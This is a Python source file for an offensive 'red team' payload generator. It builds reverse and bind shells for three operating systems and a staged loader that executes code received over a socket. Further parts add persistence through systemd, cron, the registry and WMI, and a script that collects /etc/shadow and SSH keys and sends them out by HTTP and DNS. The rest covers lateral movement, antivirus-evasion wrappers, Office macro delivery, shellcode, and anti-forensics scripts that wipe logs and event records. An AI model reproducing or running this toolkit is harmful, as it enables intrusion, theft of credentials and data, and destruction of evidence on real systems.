"""
Red Team Platform - Advanced Payload Generation System
Military-grade payload development and evasion techniques
"""

import os
import base64
import zlib
import random
import string
import hashlib
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import struct

class AdvancedPayloadGenerator:
    """Generate sophisticated, evasive payloads for penetration testing"""
    
    def __init__(self):
        self.evasion_techniques = {
            'encoding': ['base64', 'hex', 'url', 'unicode', 'double_encoding'],
            'obfuscation': ['string_splitting', 'variable_substitution', 'dead_code_insertion'],
            'encryption': ['aes256', 'rc4', 'custom_xor'],
            'polymorphism': ['instruction_reordering', 'register_swapping', 'nop_insertion'],
            'anti_debug': ['timing_checks', 'vm_detection', 'debugger_detection'],
            'anti_av': ['signature_breaking', 'behavior_masking', 'runtime_decryption']
        }
        
        self.shellcode_templates = self._load_shellcode_templates()
        self.persistence_methods = self._load_persistence_methods()
        
    def generate_payload(self, payload_config):
        """Generate advanced payload with specified configuration"""
        payload_type = payload_config.get('type', 'reverse_shell')
        target_os = payload_config.get('os', 'linux')
        evasion_level = payload_config.get('evasion_level', 'medium')
        delivery_method = payload_config.get('delivery', 'binary')
        
        # Generate base payload
        base_payload = self._generate_base_payload(payload_type, target_os, payload_config)
        
        # Apply evasion techniques
        evasive_payload = self._apply_evasion_techniques(base_payload, evasion_level)
        
        # Format for delivery
        final_payload = self._format_for_delivery(evasive_payload, delivery_method)
        
        return {
            'payload': final_payload,
            'type': payload_type,
            'target_os': target_os,
            'evasion_level': evasion_level,
            'delivery_method': delivery_method,
            'size': len(final_payload),
            'hash': hashlib.sha256(final_payload.encode()).hexdigest()[:16],
            'instructions': self._generate_deployment_instructions(payload_config)
        }
    
    def _generate_base_payload(self, payload_type, target_os, config):
        """Generate base payload without evasion"""
        if payload_type == 'reverse_shell':
            return self._generate_reverse_shell(target_os, config)
        elif payload_type == 'bind_shell':
            return self._generate_bind_shell(target_os, config)
        elif payload_type == 'meterpreter':
            return self._generate_meterpreter_payload(target_os, config)
        elif payload_type == 'persistence':
            return self._generate_persistence_payload(target_os, config)
        elif payload_type == 'privilege_escalation':
            return self._generate_privesc_payload(target_os, config)
        elif payload_type == 'data_exfiltration':
            return self._generate_exfiltration_payload(target_os, config)
        elif payload_type == 'lateral_movement':
            return self._generate_lateral_payload(target_os, config)
        else:
            return self._generate_custom_payload(payload_type, target_os, config)
    
    def _generate_reverse_shell(self, target_os, config):
        """Generate reverse shell payload"""
        lhost = config.get('lhost', '127.0.0.1')
        lport = config.get('lport', 4444)
        
        if target_os == 'linux':
            return f"""
#!/bin/bash
exec 5<>/dev/tcp/{lhost}/{lport}
cat <&5 | while read line; do $line 2>&5 >&5; done
"""
        elif target_os == 'windows':
            return f"""
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
"""
        elif target_os == 'macos':
            return f"""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"""
    
    def _generate_bind_shell(self, target_os, config):
        """Generate bind shell payload"""
        lport = config.get('lport', 4444)
        
        if target_os == 'linux':
            return f"""
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l {lport} >/tmp/f
"""
        elif target_os == 'windows':
            return f"""
powershell -nop -c "$listener = [System.Net.Sockets.TcpListener]{lport}; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()"
"""
    
    def _generate_meterpreter_payload(self, target_os, config):
        """Generate Meterpreter-style payload"""
        lhost = config.get('lhost', '127.0.0.1')
        lport = config.get('lport', 4444)
        
        # Advanced multi-stage payload
        stage1 = f"""
import socket,struct,time
s=socket.socket()
s.connect(('{lhost}',{lport}))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(d,{{'s':s}})
"""
        
        return stage1
    
    def _generate_persistence_payload(self, target_os, config):
        """Generate persistence payload"""
        if target_os == 'linux':
            return """
#!/bin/bash
# Systemd persistence
cat > /tmp/.hidden_service.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.hidden_binary
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

cp /tmp/.hidden_service.service /etc/systemd/system/
systemctl enable .hidden_service.service
systemctl start .hidden_service.service

# Cron persistence
echo "*/5 * * * * /tmp/.hidden_binary" | crontab -
"""
        elif target_os == 'windows':
            return """
# Registry persistence
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\update.exe" /f

# Scheduled task persistence
schtasks /create /tn "SecurityUpdate" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon /ru "SYSTEM" /f

# WMI persistence
$filterName = 'SecurityFilter'
$consumerName = 'SecurityConsumer'
$exePath = 'C:\\Windows\\Temp\\update.exe'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{Name=$consumerName;CommandLineTemplate=$exePath}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
"""
    
    def _generate_privesc_payload(self, target_os, config):
        """Generate privilege escalation payload"""
        if target_os == 'linux':
            return """
#!/bin/bash
# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Kernel exploit check
uname -a
cat /proc/version

# Sudo misconfiguration
sudo -l

# Writable /etc/passwd
ls -la /etc/passwd

# Docker escape
if [ -S /var/run/docker.sock ]; then
    docker run -v /:/hostOS -i -t ubuntu chroot /hostOS /bin/bash
fi

# Capabilities exploitation
getcap -r / 2>/dev/null | grep -v "= $"
"""
        elif target_os == 'windows':
            return """
# Windows privilege escalation
whoami /priv
whoami /groups

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\\windows\\\\" |findstr /i /v """

# AlwaysInstallElevated check
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Token impersonation
if ((whoami /priv | findstr /i "SeDebugPrivilege") -or (whoami /priv | findstr /i "SeImpersonatePrivilege")) {
    Write-Host "Token impersonation possible"
}
"""
    
    def _generate_exfiltration_payload(self, target_os, config):
        """Generate data exfiltration payload"""
        exfil_method = config.get('method', 'http')
        target_url = config.get('url', 'http://127.0.0.1:8080/upload')
        
        if exfil_method == 'http':
            return f"""
#!/bin/bash
# Data collection
tar -czf /tmp/data.tar.gz /home/*/.ssh /etc/passwd /etc/shadow /var/log/* 2>/dev/null

# HTTP exfiltration
curl -X POST -F "file=@/tmp/data.tar.gz" {target_url}

# DNS exfiltration (base64 encoded)
data=$(base64 -w 0 /tmp/data.tar.gz)
for i in $(seq 0 60 ${{#data}}); do
    chunk=${{data:$i:60}}
    nslookup $chunk.exfil.domain.com
done
"""
        elif exfil_method == 'icmp':
            return """
#!/bin/bash
# ICMP exfiltration
file_data=$(xxd -p /tmp/sensitive_data.txt | tr -d '\\n')
target_ip="127.0.0.1"

for i in $(seq 0 32 ${#file_data}); do
    chunk=${file_data:$i:32}
    ping -c 1 -p $chunk $target_ip
done
"""
    
    def _generate_lateral_payload(self, target_os, config):
        """Generate lateral movement payload"""
        return """
#!/bin/bash
# Network discovery
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i &
done
wait

# SSH key collection
find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null

# Password spraying
hydra -L users.txt -P passwords.txt ssh://192.168.1.0/24

# SMB enumeration
enum4linux -a 192.168.1.0/24
smbclient -L //192.168.1.0 -N

# Kerberoasting
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request
"""
    
    def _apply_evasion_techniques(self, payload, evasion_level):
        """Apply sophisticated evasion techniques"""
        if evasion_level == 'low':
            return self._apply_basic_evasion(payload)
        elif evasion_level == 'medium':
            return self._apply_medium_evasion(payload)
        elif evasion_level == 'high':
            return self._apply_advanced_evasion(payload)
        else:
            return payload
    
    def _apply_basic_evasion(self, payload):
        """Apply basic evasion techniques"""
        # Base64 encoding
        encoded = base64.b64encode(payload.encode()).decode()
        
        return f"""
import base64
exec(base64.b64decode('{encoded}').decode())
"""
    
    def _apply_medium_evasion(self, payload):
        """Apply medium-level evasion"""
        # XOR encoding with random key
        key = random.randint(1, 255)
        encoded = ''.join(chr(ord(c) ^ key) for c in payload)
        encoded_b64 = base64.b64encode(encoded.encode('latin-1')).decode()
        
        return f"""
import base64
key = {key}
encoded = base64.b64decode('{encoded_b64}').decode('latin-1')
decoded = ''.join(chr(ord(c) ^ key) for c in encoded)
exec(decoded)
"""
    
    def _apply_advanced_evasion(self, payload):
        """Apply advanced evasion techniques"""
        # Multiple layers of encryption and obfuscation
        
        # Layer 1: XOR with rotating key
        key_base = random.randint(1, 255)
        layer1 = ''.join(chr(ord(c) ^ (key_base + i) % 256) for i, c in enumerate(payload))
        
        # Layer 2: Compression
        layer2 = zlib.compress(layer1.encode('latin-1'))
        
        # Layer 3: Base64 encoding
        layer3 = base64.b64encode(layer2).decode()
        
        # Layer 4: String obfuscation
        chunks = [layer3[i:i+10] for i in range(0, len(layer3), 10)]
        obfuscated_chunks = [f'"{chunk}"' for chunk in chunks]
        
        return f"""
import base64, zlib
key_base = {key_base}
chunks = [{'+'.join(obfuscated_chunks)}]
layer3 = ''.join(chunks)
layer2 = base64.b64decode(layer3)
layer1 = zlib.decompress(layer2).decode('latin-1')
decoded = ''.join(chr(ord(c) ^ (key_base + i) % 256) for i, c in enumerate(layer1))
exec(decoded)
"""
    
    def _format_for_delivery(self, payload, delivery_method):
        """Format payload for specific delivery method"""
        if delivery_method == 'powershell':
            # PowerShell-specific formatting
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            return f"powershell -EncodedCommand {encoded}"
        
        elif delivery_method == 'javascript':
            # JavaScript formatting for web delivery
            escaped = payload.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')
            return f'eval("{escaped}");'
        
        elif delivery_method == 'binary':
            # Binary executable wrapper
            return self._create_binary_wrapper(payload)
        
        elif delivery_method == 'macro':
            # Office macro formatting
            return self._create_macro_wrapper(payload)
        
        else:
            return payload
    
    def _create_binary_wrapper(self, payload):
        """Create binary executable wrapper"""
        # Simple stub that executes the payload
        return f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {{
    char payload[] = "{payload.replace('"', '\\"')}";
    system(payload);
    return 0;
}}
"""
    
    def _create_macro_wrapper(self, payload):
        """Create Office macro wrapper"""
        return f"""
Sub AutoOpen()
    Shell "{payload}", vbHide
End Sub

Sub Document_Open()
    AutoOpen
End Sub
"""
    
    def _generate_deployment_instructions(self, config):
        """Generate deployment instructions for the payload"""
        payload_type = config.get('type', 'reverse_shell')
        delivery_method = config.get('delivery', 'binary')
        target_os = config.get('os', 'linux')
        
        instructions = [
            f"Payload Type: {payload_type}",
            f"Target OS: {target_os}",
            f"Delivery Method: {delivery_method}",
            "",
            "Deployment Steps:"
        ]
        
        if delivery_method == 'binary':
            instructions.extend([
                "1. Compile the payload if necessary",
                "2. Transfer to target system",
                "3. Make executable (chmod +x)",
                "4. Execute payload"
            ])
        elif delivery_method == 'powershell':
            instructions.extend([
                "1. Open PowerShell as Administrator",
                "2. Set execution policy: Set-ExecutionPolicy Bypass",
                "3. Execute the encoded command",
                "4. Restore execution policy if needed"
            ])
        elif delivery_method == 'javascript':
            instructions.extend([
                "1. Inject into web page or browser console",
                "2. Ensure JavaScript is enabled",
                "3. Monitor for callback connection"
            ])
        
        return '\n'.join(instructions)
    
    def _load_shellcode_templates(self):
        """Load architecture-specific shellcode templates"""
        return {
            'x86': {
                'execve_bin_sh': (
                    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
                    "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
                ),
                'reverse_tcp': (
                    "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66"
                    "\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f"
                    "\\x00\\x00\\x01\\x68\\x02\\x00\\x11\\x5c\\x89\\xe1\\xb0\\x66\\x50"
                    "\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x2f\\x2f\\x73"
                    "\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0"
                    "\\x0b\\xcd\\x80"
                )
            },
            'x64': {
                'execve_bin_sh': (
                    "\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
                    "\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x31\\xc0"
                    "\\xb0\\x3b\\x0f\\x05"
                )
            }
        }
    
    def _load_persistence_methods(self):
        """Load OS-specific persistence methods"""
        return {
            'linux': [
                'systemd_service',
                'cron_job',
                'bashrc_modification',
                'ssh_key_injection',
                'library_hijacking'
            ],
            'windows': [
                'registry_run_key',
                'scheduled_task',
                'wmi_subscription',
                'service_creation',
                'dll_hijacking'
            ],
            'macos': [
                'launchd_plist',
                'login_items',
                'dylib_hijacking',
                'bash_profile_modification'
            ]
        }

class PayloadEncryption:
    """Advanced payload encryption and anti-analysis techniques"""
    
    def __init__(self):
        self.encryption_methods = ['aes256', 'chacha20', 'rc4_custom', 'multilayer']
    
    def encrypt_payload(self, payload, method='aes256', password=None):
        """Encrypt payload with specified method"""
        if password is None:
            password = self._generate_random_key()
        
        if method == 'aes256':
            return self._aes256_encrypt(payload, password)
        elif method == 'chacha20':
            return self._chacha20_encrypt(payload, password)
        elif method == 'rc4_custom':
            return self._rc4_custom_encrypt(payload, password)
        elif method == 'multilayer':
            return self._multilayer_encrypt(payload, password)
        else:
            raise ValueError(f"Unknown encryption method: {method}")
    
    def _aes256_encrypt(self, payload, password):
        """AES-256 encryption with PBKDF2 key derivation"""
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        f = Fernet(key)
        encrypted = f.encrypt(payload.encode())
        
        return {
            'encrypted_payload': base64.b64encode(encrypted).decode(),
            'salt': base64.b64encode(salt).decode(),
            'method': 'aes256',
            'decryption_stub': self._generate_aes_decryption_stub()
        }
    
    def _generate_aes_decryption_stub(self):
        """Generate AES decryption stub"""
        return """
import base64, os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def decrypt_and_execute(encrypted_data, salt, password):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=base64.b64decode(salt),
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    f = Fernet(key)
    payload = f.decrypt(base64.b64decode(encrypted_data))
    exec(payload.decode())
"""
    
    def _generate_random_key(self, length=32):
        """Generate cryptographically secure random key"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class AntiForensics:
    """Advanced anti-forensics and evidence elimination"""
    
    def __init__(self):
        self.cleanup_methods = [
            'secure_delete',
            'log_tampering',
            'timestamp_manipulation',
            'memory_clearing',
            'artifact_removal'
        ]
    
    def generate_cleanup_script(self, target_os='linux'):
        """Generate comprehensive cleanup script"""
        if target_os == 'linux':
            return self._generate_linux_cleanup()
        elif target_os == 'windows':
            return self._generate_windows_cleanup()
        else:
            return self._generate_generic_cleanup()
    
    def _generate_linux_cleanup(self):
        """Generate Linux-specific cleanup script"""
        return """
#!/bin/bash
# Advanced cleanup script for Linux systems

# Clear command history
history -c
history -w
echo "" > ~/.bash_history
unset HISTFILE

# Clear system logs
if [ "$EUID" -eq 0 ]; then
    > /var/log/auth.log
    > /var/log/syslog
    > /var/log/messages
    > /var/log/secure
    > /var/log/wtmp
    > /var/log/utmp
    > /var/log/lastlog
fi

# Clear temporary files
find /tmp -name "*" -type f -delete 2>/dev/null
find /var/tmp -name "*" -type f -delete 2>/dev/null

# Clear browser artifacts
rm -rf ~/.mozilla/firefox/*/cookies.sqlite
rm -rf ~/.config/google-chrome/Default/Cookies
rm -rf ~/.config/chromium/Default/Cookies

# Secure delete function
secure_delete() {
    if command -v shred >/dev/null 2>&1; then
        shred -vfz -n 3 "$1"
    elif command -v wipe >/dev/null 2>&1; then
        wipe -rf "$1"
    else
        dd if=/dev/urandom of="$1" bs=1024 count=$(du -k "$1" | cut -f1) 2>/dev/null
        rm -f "$1"
    fi
}

# Clear swap files
if [ "$EUID" -eq 0 ]; then
    swapoff -a
    swapon -a
fi

# Clear free space (anti-forensics)
dd if=/dev/zero of=/tmp/fillup bs=1M 2>/dev/null || true
rm -f /tmp/fillup
"""
    
    def _generate_windows_cleanup(self):
        """Generate Windows-specific cleanup script"""
        return """
@echo off
REM Advanced cleanup script for Windows systems

REM Clear event logs
for /f "tokens=*" %%G in ('wevtutil.exe el') do (
    wevtutil.exe cl "%%G" 2>nul
)

REM Clear command history
doskey /history
del "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>nul

REM Clear temporary files
del /q /f /s "%TEMP%\\*" 2>nul
del /q /f /s "%WINDIR%\\Temp\\*" 2>nul

REM Clear browser artifacts
del /q /f "%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\History\\*" 2>nul
del /q /f "%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\*" 2>nul
del /q /f "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies" 2>nul
del /q /f "%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite" 2>nul

REM Clear recent documents
del /q /f "%USERPROFILE%\\Recent\\*" 2>nul

REM Clear prefetch
del /q /f "%WINDIR%\\Prefetch\\*" 2>nul

REM Clear DNS cache
ipconfig /flushdns

REM Clear ARP cache
arp -d *

REM Disable Windows Error Reporting
reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f 2>nul

REM Clear USN journal
fsutil usn deletejournal /d C: 2>nul
"""

# Global payload generator instance
payload_generator = AdvancedPayloadGenerator()
payload_encryption = PayloadEncryption()
anti_forensics = AntiForensics()